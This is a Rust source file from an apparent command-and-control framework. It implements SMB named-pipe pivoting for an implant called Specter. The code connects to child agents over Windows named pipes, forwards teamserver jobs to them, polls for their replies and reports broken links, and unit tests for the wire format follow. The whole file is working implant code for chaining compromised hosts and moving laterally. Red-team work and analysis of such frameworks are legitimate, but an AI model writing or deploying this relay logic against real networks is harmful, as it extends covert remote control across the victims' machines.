//! Pivot state management for SMB pivot chains.
//!
//! This module implements the `CommandPivot` (ID 2520) handler for the Specter
//! agent.  It maintains a collection of connected child agents reachable via
//! Windows named pipes.  On non-Windows platforms a lightweight stub is provided
//! so the command handlers compile and return appropriate error responses.
//!
//! # Wire format (response payloads)
//!
//! All response integers use **little-endian** byte order, matching the Rust
//! teamserver's `CallbackParser` which reads LE.

use std::collections::HashMap;

use red_cell_common::demon::{DemonCommand, DemonPivotCommand};
use tracing::{info, warn};

use crate::dispatch::Response;

/// Maximum number of packets to read from each pivot per poll cycle.
///
/// Mirrors the Demon's `MAX_SMB_PACKETS_PER_LOOP` constant (30).
const MAX_SMB_PACKETS_PER_LOOP: usize = 30;

/// Maximum size of a single named-pipe read/write buffer (64 KiB).
///
/// Mirrors the Demon's `PIPE_BUFFER_MAX` constant.
#[cfg(windows)]
const PIPE_BUFFER_MAX: usize = 0x10000;

// ─── Pivot entry ────────────────────────────────────────────────────────────

/// A single connected SMB pivot child agent.
#[derive(Debug)]
struct PivotEntry {
    /// The child agent's Demon ID, parsed from its init packet.
    demon_id: u32,
    /// The named pipe path used to connect (UTF-16 on Windows).
    pipe_name: String,
    /// Platform-native pipe handle.  On Windows this is a `HANDLE`; on other
    /// platforms it is always zero (stubs never create real connections).
    #[allow(dead_code)]
    handle: usize,
}

// ─── Pivot state ────────────────────────────────────────────────────────────

/// All pivot-related state for the Specter agent.
#[derive(Debug, Default)]
pub struct PivotState {
    /// Connected pivots keyed by child Demon ID.
    pivots: HashMap<u32, PivotEntry>,
    /// Pending responses to be drained by the agent loop.
    pending_responses: Vec<PendingPivotResponse>,
}

#[derive(Debug, Clone)]
struct PendingPivotResponse {
    request_id: u32,
    payload: Vec<u8>,
}

impl PivotState {
    /// Create an empty pivot state.
    pub fn new() -> Self {
        Self::default()
    }

    /// Handle an incoming `CommandPivot` task from the teamserver.
    ///
    /// The `payload` must already be decrypted. Returns a [`Response`] for
    /// subcommands that produce an immediate reply (`List`, `SmbConnect`,
    /// `SmbDisconnect`).  `SmbCommand` returns `None` because its responses
    /// arrive asynchronously via [`poll`](Self::poll).
    pub fn handle_command(&mut self, payload: &[u8]) -> Option<Response> {
        let mut offset = 0;
        let subcmd_raw = match parse_u32_le(payload, &mut offset) {
            Ok(v) => v,
            Err(e) => {
                warn!("CommandPivot: failed to parse subcommand: {e}");
                return None;
            }
        };

        let subcmd = match DemonPivotCommand::try_from(subcmd_raw) {
            Ok(c) => c,
            Err(_) => {
                warn!(subcmd_raw, "CommandPivot: unknown subcommand");
                return None;
            }
        };

        info!(subcommand = ?subcmd, "CommandPivot dispatch");

        let rest = &payload[offset..];
        match subcmd {
            DemonPivotCommand::List => Some(self.handle_list()),
            DemonPivotCommand::SmbConnect => Some(self.handle_smb_connect(rest)),
            DemonPivotCommand::SmbDisconnect => Some(self.handle_smb_disconnect(rest)),
            DemonPivotCommand::SmbCommand => {
                self.handle_smb_command(rest);
                None
            }
        }
    }

    /// Poll all connected pivots for pending data from child agents.
    ///
    /// Must be called periodically from the agent run loop.  Any data read
    /// from pivot pipes is queued as `SmbCommand` responses to be sent back
    /// to the teamserver.  Broken pipes are automatically cleaned up and
    /// reported as disconnections.
    pub fn poll(&mut self) {
        // Collect IDs first to avoid borrow conflicts during mutation.
        let ids: Vec<u32> = self.pivots.keys().copied().collect();

        for demon_id in ids {
            let handle = match self.pivots.get(&demon_id) {
                Some(entry) => entry.handle,
                None => continue,
            };

            for _ in 0..MAX_SMB_PACKETS_PER_LOOP {
                match native::pipe_peek(handle) {
                    Ok(0) => break, // no data available
                    Ok(available) => {
                        // Read the full Demon packet: first 4 bytes are the
                        // big-endian size, then the rest of the packet.
                        match native::pipe_read_packet(handle, available) {
                            Ok(data) => {
                                let mut out = Vec::new();
                                write_u32_le(&mut out, u32::from(DemonPivotCommand::SmbCommand));
                                write_bytes_le(&mut out, &data);
                                self.pending_responses
                                    .push(PendingPivotResponse { request_id: 0, payload: out });
                            }
                            Err(e) => {
                                warn!(demon_id, error = %e, "pivot pipe read failed");
                                break;
                            }
                        }
                    }
                    Err(e) if e.is_broken_pipe() => {
                        info!(demon_id, "pivot pipe broken — removing pivot");
                        let removed = self.pivots.remove(&demon_id).is_some();
                        if removed {
                            native::pipe_close(handle);
                        }
                        // Report the disconnection to the teamserver.
                        let mut out = Vec::new();
                        write_u32_le(&mut out, u32::from(DemonPivotCommand::SmbDisconnect));
                        write_u32_le(&mut out, u32::from(removed));
                        write_u32_le(&mut out, demon_id);
                        self.pending_responses
                            .push(PendingPivotResponse { request_id: 0, payload: out });
                        break;
                    }
                    Err(e) => {
                        warn!(demon_id, error = %e, "pivot pipe peek failed");
                        break;
                    }
                }
            }
        }
    }

    /// Drain all pending responses queued during [`handle_command`](Self::handle_command) and [`poll`](Self::poll).
    pub fn drain_responses(&mut self) -> Vec<Response> {
        self.pending_responses
            .drain(..)
            .map(|r| Response {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id: r.request_id,
                payload: r.payload,
            })
            .collect()
    }

    /// Returns `true` if there are connected pivots that need periodic polling.
    pub fn has_active_pivots(&self) -> bool {
        !self.pivots.is_empty()
    }

    // ─── Subcommand handlers ────────────────────────────────────────────────

    /// `DEMON_PIVOT_LIST (1)` — enumerate connected pivots.
    ///
    /// Response payload (LE): `[subcmd: u32]([demon_id: u32][pipe_name: wstring])*`
    fn handle_list(&self) -> Response {
        let mut out = Vec::new();
        write_u32_le(&mut out, u32::from(DemonPivotCommand::List));

        for entry in self.pivots.values() {
            write_u32_le(&mut out, entry.demon_id);
            write_utf16le(&mut out, &entry.pipe_name);
        }

        Response { command_id: u32::from(DemonCommand::CommandPivot), request_id: 0, payload: out }
    }

    /// `DEMON_PIVOT_SMB_CONNECT (10)` — connect to a child agent's named pipe.
    ///
    /// Incoming args (LE): `[pipe_name: bytes(utf16)]`
    /// Response on success (LE): `[subcmd: u32][success(1): u32][init_data: bytes]`
    /// Response on failure (LE): `[subcmd: u32][success(0): u32][error_code: u32]`
    fn handle_smb_connect(&mut self, rest: &[u8]) -> Response {
        let mut offset = 0;
        let pipe_name_bytes = match parse_bytes_le(rest, &mut offset) {
            Ok(v) => v,
            Err(e) => {
                warn!("Pivot::SmbConnect: failed to parse pipe name: {e}");
                return self.smb_connect_error(native::ERROR_INVALID_PARAMETER);
            }
        };

        let pipe_name = decode_utf16le_null(&pipe_name_bytes);
        info!(pipe_name = %pipe_name, "Pivot::SmbConnect");

        match native::pipe_connect(&pipe_name_bytes) {
            Ok((handle, init_data)) => {
                let demon_id = parse_demon_id_from_init(&init_data);
                info!(demon_id = format_args!("0x{demon_id:08X}"), pipe_name = %pipe_name, "pivot connected");

                self.pivots.insert(
                    demon_id,
                    PivotEntry { demon_id, pipe_name: pipe_name.clone(), handle },
                );

                let mut out = Vec::new();
                write_u32_le(&mut out, u32::from(DemonPivotCommand::SmbConnect));
                write_u32_le(&mut out, 1); // success = TRUE
                write_bytes_le(&mut out, &init_data);
                Response {
                    command_id: u32::from(DemonCommand::CommandPivot),
                    request_id: 0,
                    payload: out,
                }
            }
            Err(e) => {
                warn!(pipe_name = %pipe_name, error = %e, "Pivot::SmbConnect failed");
                self.smb_connect_error(e.raw_os_error())
            }
        }
    }

    /// Build a failure response for `SmbConnect`.
    fn smb_connect_error(&self, error_code: u32) -> Response {
        let mut out = Vec::new();
        write_u32_le(&mut out, u32::from(DemonPivotCommand::SmbConnect));
        write_u32_le(&mut out, 0); // success = FALSE
        write_u32_le(&mut out, error_code);
        Response { command_id: u32::from(DemonCommand::CommandPivot), request_id: 0, payload: out }
    }

    /// `DEMON_PIVOT_SMB_DISCONNECT (11)` — disconnect a child agent.
    ///
    /// Incoming args (LE): `[agent_id: u32]`
    /// Response (LE): `[subcmd: u32][success: u32][agent_id: u32]`
    fn handle_smb_disconnect(&mut self, rest: &[u8]) -> Response {
        let mut offset = 0;
        let agent_id = match parse_u32_le(rest, &mut offset) {
            Ok(v) => v,
            Err(e) => {
                warn!("Pivot::SmbDisconnect: failed to parse agent_id: {e}");
                let mut out = Vec::new();
                write_u32_le(&mut out, u32::from(DemonPivotCommand::SmbDisconnect));
                write_u32_le(&mut out, 0); // failure
                write_u32_le(&mut out, 0);
                return Response {
                    command_id: u32::from(DemonCommand::CommandPivot),
                    request_id: 0,
                    payload: out,
                };
            }
        };

        let success = if let Some(entry) = self.pivots.remove(&agent_id) {
            native::pipe_disconnect_and_close(entry.handle);
            info!(agent_id = format_args!("0x{agent_id:08X}"), "pivot disconnected");
            1u32
        } else {
            warn!(agent_id = format_args!("0x{agent_id:08X}"), "pivot not found for disconnect");
            0u32
        };

        let mut out = Vec::new();
        write_u32_le(&mut out, u32::from(DemonPivotCommand::SmbDisconnect));
        write_u32_le(&mut out, success);
        write_u32_le(&mut out, agent_id);
        Response { command_id: u32::from(DemonCommand::CommandPivot), request_id: 0, payload: out }
    }

    /// `DEMON_PIVOT_SMB_COMMAND (12)` — forward a job to a child agent.
    ///
    /// Incoming args (LE): `[demon_id: u32][data: bytes]`
    ///
    /// No immediate response — the child's reply arrives via [`poll`](Self::poll).
    fn handle_smb_command(&mut self, rest: &[u8]) {
        let mut offset = 0;
        let demon_id = match parse_u32_le(rest, &mut offset) {
            Ok(v) => v,
            Err(e) => {
                warn!("Pivot::SmbCommand: failed to parse demon_id: {e}");
                return;
            }
        };
        let data = match parse_bytes_le(&rest[offset..], &mut 0) {
            Ok(v) => v,
            Err(e) => {
                warn!("Pivot::SmbCommand: failed to parse data: {e}");
                return;
            }
        };

        if data.is_empty() {
            warn!("Pivot::SmbCommand: empty data, ignoring");
            return;
        }

        let entry = match self.pivots.get(&demon_id) {
            Some(e) => e,
            None => {
                warn!(
                    demon_id = format_args!("0x{demon_id:08X}"),
                    "pivot not found for SmbCommand"
                );
                return;
            }
        };

        if let Err(e) = native::pipe_write(entry.handle, &data) {
            warn!(
                demon_id = format_args!("0x{demon_id:08X}"),
                error = %e,
                "Pivot::SmbCommand pipe write failed"
            );
        }
    }
}

// ─── Parse Demon ID from init packet ────────────────────────────────────────

/// Extract the child agent's Demon ID from its init packet.
///
/// The init packet wire layout (big-endian) is:
/// `[size: u32][magic: u32][agent_id: u32][...]`
///
/// We skip size (4 bytes) and magic (4 bytes), then read the agent ID.
fn parse_demon_id_from_init(data: &[u8]) -> u32 {
    if data.len() < 12 {
        return 0;
    }
    u32::from_be_bytes([data[8], data[9], data[10], data[11]])
}

// ─── Serialisation helpers ──────────────────────────────────────────────────

fn parse_u32_le(buf: &[u8], offset: &mut usize) -> Result<u32, &'static str> {
    if buf.len() < *offset + 4 {
        return Err("buffer too short for u32");
    }
    let v = u32::from_le_bytes(buf[*offset..*offset + 4].try_into().unwrap_or([0; 4]));
    *offset += 4;
    Ok(v)
}

fn parse_bytes_le(buf: &[u8], offset: &mut usize) -> Result<Vec<u8>, &'static str> {
    let len = parse_u32_le(buf, offset)? as usize;
    if buf.len() < *offset + len {
        return Err("buffer too short for bytes payload");
    }
    let v = buf[*offset..*offset + len].to_vec();
    *offset += len;
    Ok(v)
}

fn decode_utf16le_null(bytes: &[u8]) -> String {
    let words: Vec<u16> = bytes.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();
    String::from_utf16_lossy(&words).trim_end_matches('\0').to_string()
}

fn write_u32_le(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_bytes_le(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(data);
}

fn write_utf16le(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_le(buf, &utf16);
}

// ─── Pipe error type ────────────────────────────────────────────────────────

/// Platform-agnostic pipe error.
#[derive(Debug, Clone)]
pub struct PipeError {
    code: u32,
    message: String,
    broken_pipe: bool,
}

impl PipeError {
    fn new(code: u32, message: impl Into<String>) -> Self {
        Self { code, message: message.into(), broken_pipe: false }
    }

    #[cfg(windows)]
    fn broken_pipe(code: u32, message: impl Into<String>) -> Self {
        Self { code, message: message.into(), broken_pipe: true }
    }

    /// Whether this error indicates the pipe is broken (child disconnected).
    pub fn is_broken_pipe(&self) -> bool {
        self.broken_pipe
    }

    /// The raw Win32 error code (or 0 on non-Windows).
    pub fn raw_os_error(&self) -> u32 {
        self.code
    }
}

impl std::fmt::Display for PipeError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[{}] {}", self.code, self.message)
    }
}

// ─── Windows native pipe operations ─────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod native {
    use super::*;
    use windows_sys::Win32::Foundation::{
        CloseHandle, ERROR_BROKEN_PIPE as WIN32_ERROR_BROKEN_PIPE, ERROR_PIPE_BUSY, GENERIC_READ,
        GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE,
    };
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, OPEN_EXISTING, ReadFile, WriteFile,
    };
    use windows_sys::Win32::System::Pipes::{DisconnectNamedPipe, PeekNamedPipe, WaitNamedPipeW};

    pub const ERROR_INVALID_PARAMETER: u32 = 87;

    /// Connect to a named pipe and read the child agent's init packet.
    ///
    /// Returns the pipe handle and the raw init data on success.
    pub fn pipe_connect(pipe_name_utf16: &[u8]) -> Result<(usize, Vec<u8>), PipeError> {
        let wide: Vec<u16> =
            pipe_name_utf16.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();

        // Ensure NUL-terminated for CreateFileW.
        let mut wide_nul = wide.clone();
        if !wide_nul.last().is_some_and(|&c| c == 0) {
            wide_nul.push(0);
        }

        let handle = unsafe {
            CreateFileW(
                wide_nul.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut() as _,
            )
        };

        if handle == INVALID_HANDLE_VALUE {
            let err = unsafe { GetLastError() };
            if err == ERROR_PIPE_BUSY {
                // Wait up to 5 seconds for the pipe to become available.
                let ok = unsafe { WaitNamedPipeW(wide_nul.as_ptr(), 5000) };
                if ok == 0 {
                    let err2 = unsafe { GetLastError() };
                    return Err(PipeError::new(err2, "WaitNamedPipeW failed"));
                }
                // Retry CreateFileW after wait.
                let handle2 = unsafe {
                    CreateFileW(
                        wide_nul.as_ptr(),
                        GENERIC_READ | GENERIC_WRITE,
                        0,
                        std::ptr::null(),
                        OPEN_EXISTING,
                        0,
                        std::ptr::null_mut() as _,
                    )
                };
                if handle2 == INVALID_HANDLE_VALUE {
                    let err3 = unsafe { GetLastError() };
                    return Err(PipeError::new(err3, "CreateFileW retry failed"));
                }
                return read_init_data(handle2 as usize);
            }
            return Err(PipeError::new(err, "CreateFileW failed"));
        }

        read_init_data(handle as usize)
    }

    /// Read the initial data from a freshly connected pipe (the child's init
    /// header).  Loops on PeekNamedPipe until data arrives.
    fn read_init_data(handle: usize) -> Result<(usize, Vec<u8>), PipeError> {
        loop {
            let mut bytes_available: u32 = 0;
            let ok = unsafe {
                PeekNamedPipe(
                    handle as _,
                    std::ptr::null_mut(),
                    0,
                    std::ptr::null_mut(),
                    &mut bytes_available,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                let err = unsafe { GetLastError() };
                unsafe { CloseHandle(handle as _) };
                return Err(PipeError::new(err, "PeekNamedPipe failed during init read"));
            }
            if bytes_available > 0 {
                let mut buf = vec![0u8; bytes_available as usize];
                let mut bytes_read: u32 = 0;
                let ok = unsafe {
                    ReadFile(
                        handle as _,
                        buf.as_mut_ptr().cast(),
                        bytes_available,
                        &mut bytes_read,
                        std::ptr::null_mut(),
                    )
                };
                if ok == 0 {
                    let err = unsafe { GetLastError() };
                    unsafe { CloseHandle(handle as _) };
                    return Err(PipeError::new(err, "ReadFile failed during init read"));
                }
                buf.truncate(bytes_read as usize);
                return Ok((handle, buf));
            }
            // Brief yield to avoid busy-spinning.
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    /// Peek a named pipe for available data.  Returns the number of bytes
    /// available, or a [`PipeError`] on failure.
    pub fn pipe_peek(handle: usize) -> Result<usize, PipeError> {
        let mut bytes_available: u32 = 0;
        let ok = unsafe {
            PeekNamedPipe(
                handle as _,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                &mut bytes_available,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() };
            if err == WIN32_ERROR_BROKEN_PIPE {
                return Err(PipeError::broken_pipe(err, "pipe broken"));
            }
            return Err(PipeError::new(err, "PeekNamedPipe failed"));
        }
        Ok(bytes_available as usize)
    }

    /// Read a complete Demon packet from the pipe.
    ///
    /// The first 4 bytes (big-endian) contain the packet size; the total read
    /// is `size + 4`.  If `available` is less than 4, peeks again to get the
    /// full size header first.
    pub fn pipe_read_packet(handle: usize, available: usize) -> Result<Vec<u8>, PipeError> {
        if available < 4 {
            return Err(PipeError::new(0, "not enough data for size header"));
        }

        // Peek the first 4 bytes to determine packet length.
        let mut size_buf = [0u8; 4];
        let mut bytes_available: u32 = 0;
        let ok = unsafe {
            PeekNamedPipe(
                handle as _,
                size_buf.as_mut_ptr().cast(),
                4,
                std::ptr::null_mut(),
                &mut bytes_available,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(PipeError::new(err, "PeekNamedPipe size header failed"));
        }

        let packet_body_len = u32::from_be_bytes(size_buf) as usize;
        let total_len = packet_body_len + 4; // size field + body

        let mut buf = vec![0u8; total_len];
        let mut bytes_read: u32 = 0;
        let ok = unsafe {
            ReadFile(
                handle as _,
                buf.as_mut_ptr().cast(),
                total_len as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(PipeError::new(err, "ReadFile packet failed"));
        }
        buf.truncate(bytes_read as usize);
        Ok(buf)
    }

    /// Write data to a named pipe, splitting into PIPE_BUFFER_MAX-sized chunks.
    pub fn pipe_write(handle: usize, data: &[u8]) -> Result<(), PipeError> {
        let mut total: usize = 0;
        while total < data.len() {
            let chunk_size = (data.len() - total).min(PIPE_BUFFER_MAX);
            let mut written: u32 = 0;
            let ok = unsafe {
                WriteFile(
                    handle as _,
                    data[total..].as_ptr().cast(),
                    chunk_size as u32,
                    &mut written,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                let err = unsafe { GetLastError() };
                return Err(PipeError::new(err, "WriteFile failed"));
            }
            total += written as usize;
        }
        Ok(())
    }

    /// Disconnect and close a named pipe handle.
    pub fn pipe_disconnect_and_close(handle: usize) {
        unsafe {
            DisconnectNamedPipe(handle as _);
            CloseHandle(handle as _);
        }
    }

    /// Close a pipe handle without disconnecting.
    pub fn pipe_close(handle: usize) {
        unsafe {
            CloseHandle(handle as _);
        }
    }
}

// ─── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
mod native {
    use super::*;

    pub const ERROR_INVALID_PARAMETER: u32 = 87;

    pub fn pipe_connect(_pipe_name_utf16: &[u8]) -> Result<(usize, Vec<u8>), PipeError> {
        Err(PipeError::new(0, "SMB pivot not supported on this platform"))
    }

    pub fn pipe_peek(_handle: usize) -> Result<usize, PipeError> {
        Ok(0) // no data ever available on stubs
    }

    pub fn pipe_read_packet(_handle: usize, _available: usize) -> Result<Vec<u8>, PipeError> {
        Err(PipeError::new(0, "SMB pivot not supported on this platform"))
    }

    pub fn pipe_write(_handle: usize, _data: &[u8]) -> Result<(), PipeError> {
        Err(PipeError::new(0, "SMB pivot not supported on this platform"))
    }

    pub fn pipe_disconnect_and_close(_handle: usize) {}

    pub fn pipe_close(_handle: usize) {}
}

// ─── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::demon::DemonPivotCommand;

    #[test]
    fn parse_demon_id_from_init_valid() {
        // size(4) + magic(4) + agent_id(4) + extra
        let mut data = Vec::new();
        data.extend_from_slice(&100u32.to_be_bytes()); // size
        data.extend_from_slice(&0xDEAD_BEEFu32.to_be_bytes()); // magic
        data.extend_from_slice(&0x12345678u32.to_be_bytes()); // agent_id
        data.extend_from_slice(&[0xAA; 10]); // extra data

        assert_eq!(parse_demon_id_from_init(&data), 0x12345678);
    }

    #[test]
    fn parse_demon_id_from_init_too_short() {
        assert_eq!(parse_demon_id_from_init(&[0; 11]), 0);
        assert_eq!(parse_demon_id_from_init(&[]), 0);
    }

    #[test]
    fn pivot_state_new_is_empty() {
        let state = PivotState::new();
        assert!(!state.has_active_pivots());
        assert!(state.pivots.is_empty());
    }

    #[test]
    fn handle_list_empty() {
        let state = PivotState::new();
        let resp = state.handle_list();

        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPivot));
        // Payload should contain just the subcmd u32 (List = 1).
        assert_eq!(resp.payload.len(), 4);
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().unwrap());
        assert_eq!(subcmd, u32::from(DemonPivotCommand::List));
    }

    #[test]
    fn handle_list_with_entries() {
        let mut state = PivotState::new();
        state.pivots.insert(
            0xAABB,
            PivotEntry { demon_id: 0xAABB, pipe_name: "pipe1".to_string(), handle: 0 },
        );

        let resp = state.handle_list();
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPivot));

        // Parse: subcmd(4) + demon_id(4) + wstring(4 len + utf16 data)
        let mut offset = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut offset).unwrap();
        assert_eq!(subcmd, u32::from(DemonPivotCommand::List));
        let demon_id = parse_u32_le(&resp.payload, &mut offset).unwrap();
        assert_eq!(demon_id, 0xAABB);
        let name_bytes = parse_bytes_le(&resp.payload, &mut offset).unwrap();
        let name = decode_utf16le_null(&name_bytes);
        assert_eq!(name, "pipe1");
    }

    #[test]
    fn handle_smb_connect_non_windows_fails() {
        if cfg!(windows) {
            return; // skip on windows — native code will attempt real pipe
        }
        let mut state = PivotState::new();

        // Build a payload: [subcmd: u32 LE][pipe_name: bytes_le(utf16)]
        let pipe = r"\\.\pipe\test";
        let pipe_utf16: Vec<u8> = pipe
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();

        let mut payload = Vec::new();
        write_u32_le(&mut payload, u32::from(DemonPivotCommand::SmbConnect));
        write_bytes_le(&mut payload, &pipe_utf16);

        let resp = state.handle_command(&payload);
        // On non-Windows, connect fails, so we get an error response.
        let resp = resp.expect("should get error response");
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(subcmd, u32::from(DemonPivotCommand::SmbConnect));
        let success = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(success, 0); // failure
    }

    #[test]
    fn handle_smb_disconnect_not_found() {
        let mut state = PivotState::new();

        let mut payload = Vec::new();
        write_u32_le(&mut payload, u32::from(DemonPivotCommand::SmbDisconnect));
        write_u32_le(&mut payload, 0xDEAD); // non-existent agent

        let resp = state.handle_command(&payload);
        let resp = resp.expect("should get response");
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(subcmd, u32::from(DemonPivotCommand::SmbDisconnect));
        let success = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(success, 0); // not found
        let agent_id = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(agent_id, 0xDEAD);
    }

    #[test]
    fn handle_smb_disconnect_removes_entry() {
        let mut state = PivotState::new();
        state.pivots.insert(
            0x1234,
            PivotEntry { demon_id: 0x1234, pipe_name: "test".to_string(), handle: 0 },
        );
        assert!(state.has_active_pivots());

        let mut payload = Vec::new();
        write_u32_le(&mut payload, u32::from(DemonPivotCommand::SmbDisconnect));
        write_u32_le(&mut payload, 0x1234);

        let resp = state.handle_command(&payload);
        let resp = resp.expect("should get response");
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(subcmd, u32::from(DemonPivotCommand::SmbDisconnect));
        let success = parse_u32_le(&resp.payload, &mut off).unwrap();
        assert_eq!(success, 1); // removed
        assert!(!state.has_active_pivots());
    }

    #[test]
    fn handle_smb_command_no_pivot() {
        let mut state = PivotState::new();

        let mut payload = Vec::new();
        write_u32_le(&mut payload, u32::from(DemonPivotCommand::SmbCommand));
        write_u32_le(&mut payload, 0xBEEF); // demon_id
        write_bytes_le(&mut payload, &[1, 2, 3]); // data

        // SmbCommand returns None (no immediate response).
        let resp = state.handle_command(&payload);
        assert!(resp.is_none());
    }

    #[test]
    fn handle_command_invalid_subcommand() {
        let mut state = PivotState::new();
        let mut payload = Vec::new();
        write_u32_le(&mut payload, 999); // invalid subcmd

        let resp = state.handle_command(&payload);
        assert!(resp.is_none());
    }

    #[test]
    fn handle_command_empty_payload() {
        let mut state = PivotState::new();
        let resp = state.handle_command(&[]);
        assert!(resp.is_none());
    }

    #[test]
    fn drain_responses_empty() {
        let mut state = PivotState::new();
        let responses = state.drain_responses();
        assert!(responses.is_empty());
    }

    #[test]
    fn poll_no_pivots_is_noop() {
        let mut state = PivotState::new();
        state.poll(); // should not panic
        assert!(state.drain_responses().is_empty());
    }

    #[test]
    fn serialisation_roundtrip_u32() {
        let mut buf = Vec::new();
        write_u32_le(&mut buf, 0x12345678);
        let mut off = 0;
        assert_eq!(parse_u32_le(&buf, &mut off).unwrap(), 0x12345678);
    }

    #[test]
    fn serialisation_roundtrip_bytes() {
        let data = vec![0xAA, 0xBB, 0xCC, 0xDD];
        let mut buf = Vec::new();
        write_bytes_le(&mut buf, &data);
        let mut off = 0;
        assert_eq!(parse_bytes_le(&buf, &mut off).unwrap(), data);
    }
}
